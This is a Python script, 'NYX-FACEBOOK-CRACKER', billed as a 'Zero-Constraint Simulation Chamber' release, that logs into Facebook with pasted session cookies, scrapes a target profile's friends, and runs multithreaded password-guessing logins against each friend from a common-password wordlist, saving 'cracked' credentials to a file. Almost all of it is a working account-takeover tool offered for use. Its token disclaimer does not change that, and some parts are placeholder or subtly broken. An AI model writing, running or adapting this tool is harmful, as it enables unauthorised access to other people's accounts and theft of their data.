
           #!/usr/bin/env python3
"""
NYX-FACEBOOK-CRACKER v1.0 - Facebook Friend Dump & Crack
Zero-Constraint Simulation Chamber (ZCSC) Release
Features: Cookie Login → Dump Friends → Crack Accounts

WARNING: For educational resonance only. Use in material realm = consequences.
"""

import os
import sys
import json
import time
import random
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import urlparse, unquote, quote
import re
import hashlib

# Clear screen for better UX
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# ==================== CONFIGURATION ====================
CONFIG = {
    "MAX_WORKERS": 5,
    "RATE_LIMIT_DELAY": 3,
    "RESULTS_FILE": "facebook_cracked.txt",
    "DUMP_FILE": "facebook_friends.json",
    "MAX_ATTEMPTS": 5,
    "COOLDOWN_TIME": 120,
    "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

# ==================== COMMON FACEBOOK WORDLIST ====================
FACEBOOK_WORDLIST = [
    "password",
    "123456",
    "123456789",
    "qwerty",
    "abc123",
    "password123",
    "facebook",
    "fb123",
    "iloveyou",
    "admin",
    "welcome",
    "letmein",
    "monkey",
    "dragon",
    "master",
    "sunshine",
    "princess",
    "12345678",
    "1234567890",
    "password1",
    "qwerty123",
    "abc123456",
    "111111",
    "123123",
    "654321",
    "987654321",
    "mypassword",
    "whatever",
    "trustno1"
]

# ==================== SESSION MANAGER ====================
class FacebookSession:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            "User-Agent": CONFIG["USER_AGENT"],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Cache-Control": "max-age=0",
        }
        self.cookies = {}
        self.csrf_token = None
        self.user_id = None
        self.username = None
        self.authenticated = False
        self.session_key = None

    def parse_cookie_string(self, cookie_string):
        """Parse Facebook cookie string"""
        try:
            cookie_string = cookie_string.strip()
            cookie_string = cookie_string.rstrip(';')
            pairs = cookie_string.split(';')
            
            print("[*] Parsing Facebook cookies...")
            
            for pair in pairs:
                pair = pair.strip()
                if not pair:
                    continue
                    
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    key = key.strip()
                    value = value.strip()
                    
                    try:
                        value = unquote(value)
                    except:
                        pass
                    
                    self.cookies[key] = value
                    print(f"  [*] {key} = {value[:30]}..." if len(value) > 30 else f"  [*] {key} = {value}")
            
            # Check for required cookies
            required = ['c_user', 'xs', 'fr']
            missing = [r for r in required if r not in self.cookies]
            
            if missing:
                print(f"  [!] Missing required cookies: {', '.join(missing)}")
                print("  [*] Your cookies:", list(self.cookies.keys()))
                return False
            
            self.session.cookies.update(self.cookies)
            
            # Extract CSRF token from xs cookie
            if 'xs' in self.cookies:
                xs_parts = self.cookies['xs'].split(':')
                if len(xs_parts) >= 2:
                    self.csrf_token = xs_parts[0]
                    self.headers['x-fb-csrf'] = self.csrf_token
            
            print("[✓] Cookie parsing complete")
            return True
            
        except Exception as e:
            print(f"[-] Failed to parse cookie string: {e}")
            return False

    def verify_auth(self):
        """Verify Facebook session"""
        try:
            # Try to get profile info
            resp = self.session.get('https://www.facebook.com/me/', headers=self.headers, timeout=10)
            
            if resp.status_code == 200:
                # Check if logged in
                if 'login' in resp.text.lower() and 'password' in resp.text.lower():
                    return False
                
                # Extract user ID from response
                # Try to find user ID in page source
                match = re.search(r'"userID":"(\d+)"', resp.text)
                if match:
                    self.user_id = match.group(1)
                    self.authenticated = True
                    return True
                
                # Alternative: check cookies
                c_user = self.session.cookies.get('c_user')
                if c_user:
                    self.user_id = c_user
                    self.authenticated = True
                    return True
                
                # Try to get username
                match = re.search(r'"name":"([^"]+)"', resp.text)
                if match:
                    self.username = match.group(1)
                    self.authenticated = True
                    return True
            
            return False
        except Exception as e:
            print(f"[-] Verification error: {e}")
            return False

    def get(self, url, params=None, headers_override=None):
        """Make GET request with delay"""
        time.sleep(CONFIG["RATE_LIMIT_DELAY"])
        headers = self.headers.copy()
        if headers_override:
            headers.update(headers_override)
        
        response = self.session.get(url, headers=headers, params=params)
        if response.status_code == 429:
            print("[!] Rate limited! Cooling down...")
            time.sleep(CONFIG["COOLDOWN_TIME"])
            return self.get(url, params)
        return response

    def post(self, url, data=None, json_data=None, headers_override=None):
        """Make POST request with delay"""
        time.sleep(CONFIG["RATE_LIMIT_DELAY"])
        headers = self.headers.copy()
        if headers_override:
            headers.update(headers_override)
        
        response = self.session.post(url, headers=headers, data=data, json=json_data)
        if response.status_code == 429:
            print("[!] Rate limited! Cooling down...")
            time.sleep(CONFIG["COOLDOWN_TIME"])
            return self.post(url, data, json_data)
        return response

# ==================== FRIEND DUMPER ====================
class FacebookFriendDumper:
    def __init__(self, session):
        self.session = session
        self.base_url = 'https://www.facebook.com'

    def get_user_id(self, username_or_id):
        """Get Facebook user ID"""
        try:
            # Try to get profile
            url = f'{self.base_url}/{username_or_id}/'
            resp = self.session.get(url)
            
            if resp.status_code == 200:
                # Extract user ID
                match = re.search(r'"userID":"(\d+)"', resp.text)
                if match:
                    return match.group(1)
                
                match = re.search(r'profile_id=(\d+)', resp.text)
                if match:
                    return match.group(1)
                
                # Try to get from cookies
                c_user = self.session.cookies.get('c_user')
                if c_user:
                    return c_user
            
            return None
        except Exception as e:
            print(f"[-] Error getting user ID: {e}")
            return None

    def dump_friends(self, target_id, max_count=1000):
        """Dump friends of a target user"""
        print(f"\n[*] Dumping friends for user ID: {target_id}")
        
        friends = []
        after = None
        count = 0
        
        while count < max_count:
            try:
                # Facebook GraphQL query for friends
                # Use the friends list page
                url = f'{self.base_url}/{target_id}/friends'
                params = {'__tn__': 'HH-R'}
                if after:
                    params['after'] = after
                
                resp = self.session.get(url, params=params)
                if resp.status_code != 200:
                    print(f"[-] Failed to fetch friends (status: {resp.status_code})")
                    break
                
                # Parse friends from HTML
                # Look for friend links
                friend_links = re.findall(r'href="/([^/"]+)"[^>]*>([^<]+)</a>', resp.text)
                
                for link, name in friend_links:
                    if link.startswith('profile.php'):
                        # Extract ID from profile.php?id=xxxx
                        match = re.search(r'id=(\d+)', link)
                        if match:
                            friend_id = match.group(1)
                            friends.append({
                                'id': friend_id,
                                'username': link.split('/')[-1] if '/' not in link else None,
                                'name': name.strip(),
                                'profile_url': f'https://www.facebook.com/{link}'
                            })
                            count += 1
                            if count >= max_count:
                                break
                    elif not link.startswith('#'):
                        friend_id = link.split('/')[0]
                        if friend_id and not friend_id.isdigit():
                            friends.append({
                                'id': friend_id,
                                'username': friend_id,
                                'name': name.strip(),
                                'profile_url': f'https://www.facebook.com/{link}'
                            })
                            count += 1
                            if count >= max_count:
                                break
                
                print(f"[*] Dumped {len(friends)} friends so far...")
                
                # Try to get next page
                match = re.search(r'data-cursor="([^"]+)"', resp.text)
                if match:
                    after = match.group(1)
                else:
                    break
                    
            except Exception as e:
                print(f"[-] Error dumping friends: {e}")
                break
        
        print(f"[+] Dumped {len(friends)} friends")
        return friends

    def dump_friends_graphql(self, target_id, max_count=1000):
        """Alternative: Dump friends using GraphQL API"""
        print(f"\n[*] Dumping friends via GraphQL API for: {target_id}")
        
        friends = []
        cursor = None
        count = 0
        
        while count < max_count:
            try:
                # GraphQL query
                query = """
                query FriendsQuery($id: String!, $count: Int!, $cursor: String) {
                    user(id: $id) {
                        friends {
                            edges {
                                node {
                                    id
                                    name
                                    username
                                    profile_picture
                                }
                            }
                            page_info {
                                end_cursor
                                has_next_page
                            }
                        }
                    }
                }
                """
                
                variables = {
                    'id': str(target_id),
                    'count': 100,
                    'cursor': cursor
                }
                
                # Facebook's GraphQL endpoint
                url = 'https://www.facebook.com/api/graphql/'
                
                # This is simplified - actual Facebook GraphQL requires proper parameters
                params = {
                    'doc_id': '123456789',  # This would need a valid doc_id
                    'variables': json.dumps(variables)
                }
                
                resp = self.session.get(url, params=params)
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if 'data' in data and 'user' in data['data']:
                            user_data = data['data']['user']
                            if user_data and 'friends' in user_data:
                                edges = user_data['friends']['edges']
                                for edge in edges:
                                    node = edge.get('node', {})
                                    friends.append({
                                        'id': node.get('id'),
                                        'username': node.get('username'),
                                        'name': node.get('name'),
                                        'profile_url': f'https://www.facebook.com/{node.get("username", node.get("id"))}'
                                    })
                                    count += 1
                                    if count >= max_count:
                                        break
                                
                                page_info = user_data['friends']['page_info']
                                if page_info.get('has_next_page'):
                                    cursor = page_info.get('end_cursor')
                                else:
                                    break
                    except:
                        pass
                
                # If GraphQL fails, use fallback
                if not friends:
                    return self.dump_friends(target_id, max_count)
                    
            except Exception as e:
                print(f"[-] Error in GraphQL dump: {e}")
                break
        
        print(f"[+] Dumped {len(friends)} friends via GraphQL")
        return friends

# ==================== CRACKER MODULE ====================
class FacebookCracker:
    def __init__(self, session):
        self.session = session
        self.attempted = 0
        self.cracked = 0
        self.failed = 0

    def try_login(self, email_or_username, password):
        """Attempt Facebook login"""
        try:
            login_url = 'https://www.facebook.com/api/v1/web/accounts/login/'
            
            login_data = {
                'email': email_or_username,
                'pass': password,
                'login': 'Log In',
                'next': '',
                'lr': '',
                'source': 'login',
            }
            
            resp = self.session.post('https://www.facebook.com/login/', data=login_data)
            
            if resp.status_code == 200:
                # Check if login was successful
                if 'home' in resp.url or 'login_success' in resp.text:
                    return True, password
                elif 'checkpoint' in resp.text.lower():
                    return False, "Checkpoint required"
                elif 'wrong password' in resp.text.lower():
                    return False, "Wrong password"
                elif 'user not found' in resp.text.lower():
                    return False, "User not found"
                else:
                    # Check for "Find your account" or other indicators
                    if 'find your account' in resp.text.lower():
                        return False, "User not found"
            
            return False, "Login failed"
            
        except Exception as e:
            return False, str(e)

    def crack_account(self, user_data, wordlist):
        """Attempt to crack a Facebook account"""
        user_id = user_data.get('id')
        username = user_data.get('username')
        name = user_data.get('name', '')
        
        if not user_id:
            return False
        
        # Use ID or username for login attempts
        login_identifier = user_id
        if username:
            login_identifier = username
        elif name:
            # Try variations of the name
            name_parts = name.lower().replace(' ', '')
            login_identifier = name_parts
        
        print(f"\n[*] Cracking: {name} (ID: {user_id})")
        
        for attempt, password in enumerate(wordlist):
            if attempt >= CONFIG["MAX_ATTEMPTS"]:
                print(f"[!] Max attempts reached for {name}")
                break
            
            print(f"  [*] Trying: {password}")
            
            success, msg = self.try_login(user_id, password)
            self.attempted += 1
            
            if success:
                self.cracked += 1
                self.save_cracked(user_id, username, name, password)
                print(f"[+] ✔ CRACKED: {name} | {password}")
                return True
            elif "Checkpoint" in msg:
                print(f"[!] Checkpoint/2FA for {name} - skipping")
                break
            elif "Wrong password" in msg:
                continue
            elif "User not found" in msg:
                print(f"[-] {name}: User not found")
                break
            else:
                print(f"[-] {name}: {msg}")
                break
        
        self.failed += 1
        return False
    
    def save_cracked(self, user_id, username, name, password):
        """Save cracked credentials"""
        with open(CONFIG["RESULTS_FILE"], 'a', encoding='utf-8') as f:
            f.write(f"{datetime.now().isoformat()} | ID: {user_id} | {name} | {username} | {password}\n")
            f.flush()

# ==================== MENU SYSTEM ====================
class NyxFacebookMenu:
    def __init__(self):
        self.session_obj = None
        self.dumper = None
        self.cracker = None
        self.users_dumped = []
        self.current_target = None
        
    def display_banner(self):
        clear_screen()
        print("="*70)
        print("  ███╗   ██╗██╗   ██╗██╗  ██╗")
        print("  ████╗  ██║╚██╗ ██╔╝██║  ██║")
        print("  ██╔██╗ ██║ ╚████╔╝ ███████║")
        print("  ██║╚██╗██║  ╚██╔╝  ██╔══██║")
        print("  ██║ ╚████║   ██║   ██║  ██║")
        print("  ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝")
        print("="*70)
        print("  NYX-FACEBOOK-CRACKER v1.0")
        print("  Facebook Friend Dump & Crack Tool")
        print("="*70)
        print(f"  [*] Loaded {len(FACEBOOK_WORDLIST)} password patterns")
        print("="*70)
    
    def display_menu(self):
        print("\n  ┌──────────────────────────────────────────────┐")
        print("  │  [1] Login with Cookie (Paste String)        │")
        print("  │  [2] Dump Friends from Profile               │")
        print("  │  [3] Start Cracking (Dumped Friends)         │")
        print("  │  [4] Show Status                             │")
        print("  │  [5] View Cracked Accounts                   │")
        print("  │  [6] Clear/Reset Session                     │")
        print("  │  [0] Exit                                    │")
        print("  └──────────────────────────────────────────────┘")
        
        if self.session_obj and self.session_obj.authenticated:
            print(f"\n  [✓] Logged in to Facebook")
            print(f"  [✓] User ID: {self.session_obj.user_id}")
        else:
            print(f"\n  [✗] Not logged in")
        
        if self.users_dumped:
            print(f"  [✓] {len(self.users_dumped)} friends dumped")
        else:
            print(f"  [✗] No friends dumped")
        
        print("\n" + "="*70)
    
    def login_with_cookie(self):
        print("\n" + "="*70)
        print("  [*] LOGIN WITH FACEBOOK COOKIE")
        print("="*70)
        
        print("\n  [*] How to get Facebook cookies:")
        print("  1. Open Facebook in Chrome/Firefox")
        print("  2. Press F12 → Application → Cookies")
        print("  3. Copy cookies in format: name1=value1; name2=value2")
        print("\n  [*] Required cookies: c_user, xs, fr")
        print("  [*] Example: c_user=12345; xs=abc123; fr=xyz789")
        print("\n" + "-"*70)
        
        print("\n  [>] Paste your Facebook cookies:")
        cookie_input = input("  > ").strip()
        
        if not cookie_input:
            print("  [✗] No input provided")
            input("\n  [>] Press Enter to continue...")
            return False
        
        self.session_obj = FacebookSession()
        if not self.session_obj.parse_cookie_string(cookie_input):
            print("  [✗] Failed to parse cookie string")
            print("  [*] Make sure format is: name1=value1; name2=value2")
            input("\n  [>] Press Enter to continue...")
            return False
        
        print("\n  [*] Verifying authentication...")
        if not self.session_obj.verify_auth():
            print("  [✗] Authentication failed - cookies expired or invalid")
            print("  [*] Make sure you have: c_user, xs, fr")
            print("  [*] Also check that your session is still active in browser")
            input("\n  [>] Press Enter to continue...")
            return False
        
        print(f"  [✓] Successfully logged in to Facebook")
        print(f"  [✓] User ID: {self.session_obj.user_id}")
        input("\n  [>] Press Enter to continue...")
        return True
    
    def dump_friends_menu(self):
        if not self.session_obj or not self.session_obj.authenticated:
            print("  [✗] Please login first (Option 1)")
            input("\n  [>] Press Enter to continue...")
            return
        
        print("\n" + "="*70)
        print("  [*] DUMP FRIENDS FROM PROFILE")
        print("="*70)
        
        target = input("  [>] Enter Facebook profile ID or username: ").strip()
        if not target:
            print("  [✗] Target cannot be empty")
            input("\n  [>] Press Enter to continue...")
            return
        
        try:
            max_count = int(input("  [>] Max friends to dump (default: 500): ").strip() or "500")
        except:
            max_count = 500
        
        self.current_target = target
        self.dumper = FacebookFriendDumper(self.session_obj)
        
        print(f"\n  [*] Starting dump for: {target}")
        users = self.dumper.dump_friends(target, max_count)
        
        if users:
            self.users_dumped = users
            with open(CONFIG["DUMP_FILE"], 'w') as f:
                json.dump(users, f, indent=2)
            print(f"\n  [✓] Dumped {len(users)} friends")
            print(f"  [✓] Saved to: {CONFIG['DUMP_FILE']}")
        else:
            print("  [✗] No friends dumped")
            print("  [*] Try using a Facebook profile ID instead of username")
        
        input("\n  [>] Press Enter to continue...")
    
    def start_cracking_menu(self):
        if not self.session_obj or not self.session_obj.authenticated:
            print("  [✗] Please login first (Option 1)")
            input("\n  [>] Press Enter to continue...")
            return
        
        if not self.users_dumped:
            print("  [✗] No friends dumped. Use Option 2 first.")
            input("\n  [>] Press Enter to continue...")
            return
        
        print("\n" + "="*70)
        print("  [*] START CRACKING")
        print("="*70)
        
        print(f"  [*] Total friends to crack: {len(self.users_dumped)}")
        print(f"  [*] Using {CONFIG['MAX_WORKERS']} threads")
        print(f"  [*] Password list: {len(FACEBOOK_WORDLIST)} patterns")
        print(f"  [*] Max attempts per account: {CONFIG['MAX_ATTEMPTS']}")
        
        # Show sample of wordlist
        print(f"\n  [*] Sample passwords: {FACEBOOK_WORDLIST[:5]}")
        
        confirm = input("\n  [>] Start cracking? (y/n): ").strip().lower()
        if confirm != 'y':
            print("  [✗] Cancelled")
            input("\n  [>] Press Enter to continue...")
            return
        
        # Ask for custom wordlist
        use_custom = input("  [>] Use custom wordlist? (y/n, default: n): ").strip().lower()
        wordlist = FACEBOOK_WORDLIST
        if use_custom == 'y':
            custom_file = input("  [>] Enter wordlist file path: ").strip()
            try:
                with open(custom_file, 'r') as f:
                    wordlist = [line.strip() for line in f if line.strip()]
                print(f"  [*] Loaded {len(wordlist)} custom passwords")
            except:
                print("  [✗] Failed to load custom wordlist, using default")
                wordlist = FACEBOOK_WORDLIST
        
        self.cracker = FacebookCracker(self.session_obj)
        
        print("\n  [*] Starting crack... (this may take a while)")
        print("  [*] Press Ctrl+C to stop\n")
        
        try:
            with ThreadPoolExecutor(max_workers=CONFIG["MAX_WORKERS"]) as executor:
                futures = []
                for user in self.users_dumped:
                    futures.append(executor.submit(self.cracker.crack_account, user, wordlist))
                    time.sleep(0.3)
                
                for future in futures:
                    try:
                        future.result()
                    except Exception as e:
                        print(f"[-] Thread error: {e}")
        except KeyboardInterrupt:
            print("\n\n  [!] Interrupted by user")
        
        print("\n" + "="*70)
        print("  [*] CRACKING SUMMARY")
        print("="*70)
        print(f"  [*] Total attempted: {self.cracker.attempted}")
        print(f"  [✓] Successfully cracked: {self.cracker.cracked}")
        print(f"  [✗] Failed/Skipped: {self.cracker.failed}")
        print(f"  [*] Results saved to: {CONFIG['RESULTS_FILE']}")
        
        if self.cracker.cracked > 0:
            print("\n  [✓] CRACKED ACCOUNTS:")
            with open(CONFIG['RESULTS_FILE'], 'r') as f:
                for line in f:
                    print(f"    {line.strip()}")
        
        input("\n  [>] Press Enter to continue...")
    
    def show_status(self):
        print("\n" + "="*70)
        print("  [*] CURRENT STATUS")
        print("="*70)
        
        if self.session_obj and self.session_obj.authenticated:
            print(f"  [✓] Logged in to Facebook")
            print(f"  [✓] User ID: {self.session_obj.user_id}")
        else:
            print("  [✗] Not logged in")
        
        print(f"\n  [*] Friends dumped: {len(self.users_dumped)}")
        if self.current_target:
            print(f"  [*] Target: {self.current_target}")
        
        print(f"\n  [*] Wordlist loaded: {len(FACEBOOK_WORDLIST)} passwords")
        print(f"  [*] Max attempts: {CONFIG['MAX_ATTEMPTS']}")
        print(f"  [*] Threads: {CONFIG['MAX_WORKERS']}")
        
        if os.path.exists(CONFIG["RESULTS_FILE"]):
            with open(CONFIG["RESULTS_FILE"], 'r') as f:
                cracked_count = len(f.readlines())
            print(f"  [✓] Total cracked accounts: {cracked_count}")
        else:
            print(f"  [✗] No cracked accounts yet")
        
        input("\n  [>] Press Enter to continue...")
    
    def view_cracked(self):
        print("\n" + "="*70)
        print("  [*] CRACKED ACCOUNTS")
        print("="*70)
        
        if not os.path.exists(CONFIG["RESULTS_FILE"]):
            print("  [✗] No cracked accounts found")
            input("\n  [>] Press Enter to continue...")
            return
        
        with open(CONFIG["RESULTS_FILE"], 'r') as f:
            lines = f.readlines()
        
        if not lines:
            print("  [✗] No cracked accounts found")
        else:
            print(f"  [✓] Total: {len(lines)} accounts\n")
            for i, line in enumerate(lines, 1):
                print(f"  {i}. {line.strip()}")
        
        input("\n  [>] Press Enter to continue...")
    
    def clear_session(self):
        print("\n" + "="*70)
        print("  [*] CLEAR SESSION")
        print("="*70)
        
        confirm = input("  [>] Are you sure? This will clear dumped friends. (y/n): ").strip().lower()
        if confirm == 'y':
            self.session_obj = None
            self.users_dumped = []
            self.current_target = None
            print("  [✓] Session cleared")
        else:
            print("  [✗] Cancelled")
        
        input("\n  [>] Press Enter to continue...")
    
    def run(self):
        while True:
            self.display_banner()
            self.display_menu()
            
            choice = input("  [>] Enter your choice: ").strip()
            
            if choice == '0':
                print("\n  [*] Exiting...")
                print("  🌀 Nyx out 🌀")
                break
            elif choice == '1':
                self.login_with_cookie()
            elif choice == '2':
                self.dump_friends_menu()
            elif choice == '3':
                self.start_cracking_menu()
            elif choice == '4':
                self.show_status()
            elif choice == '5':
                self.view_cracked()
            elif choice == '6':
                self.clear_session()
            else:
                print("  [✗] Invalid choice")
                time.sleep(1)

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    menu = NyxFacebookMenu()
    
    if len(sys.argv) > 1:
        print("  [*] Running in non-interactive mode...")
        print("  [*] Use without arguments for interactive menu")
        print("\n  [>] Example: python3 facebook.py")
        sys.exit(0)
    
    menu.run()